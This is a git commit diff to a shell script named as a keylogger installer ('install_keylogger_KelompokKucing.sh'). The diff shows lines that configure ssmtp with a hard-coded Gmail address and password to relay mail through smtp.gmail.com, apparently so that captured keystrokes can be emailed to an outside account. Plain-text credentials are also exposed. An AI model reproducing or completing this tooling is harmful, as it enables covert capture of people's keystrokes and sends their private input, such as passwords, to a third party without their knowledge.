40a31a5270b7bc220f4a70c651983cef4e4b6115
yagrariksa <luckyrama0@gmail.com>
2020-06-28 23:36:19 +0700

    try to fix mail

--- install_keylogger_KelompokKucing.sh
+++ install_keylogger_KelompokKucing.sh
@@ -20,8 +20,8 @@ echo "AuthUser=majorminor658@gmail.com" >> /etc/ssmtp/ssmtp.conf
 echo "AuthPass=majorminor123" >> /etc/ssmtp/ssmtp.conf
 echo "UseSTARTTLS=YER" >> /etc/ssmtp/ssmtp.conf
 echo "TLS_CA_File=/etc/pki/tls/certs/ca-bundle.crt" >> /etc/ssmtp/ssmtp.conf
-echo "root:majorminor658@gmail.com:smtp.gmail.com:587" >> /etc/ssmtp/revaliases
-echo "mainuser:majorminor658@gmail.com:smtp.gmail.com:587" >> /etc/ssmtp/revaliases
+# echo "root:majorminor658@gmail.com:smtp.gmail.com:587" >> /etc/ssmtp/revaliases
+# echo "mainuser:majorminor658@gmail.com:smtp.gmail.com:587" >> /etc/ssmtp/revaliases
 # ln -s /opt/$FOLDER/ssmtp.conf /etc/ssmtp/ssmtp.conf
 
 # create keymaps
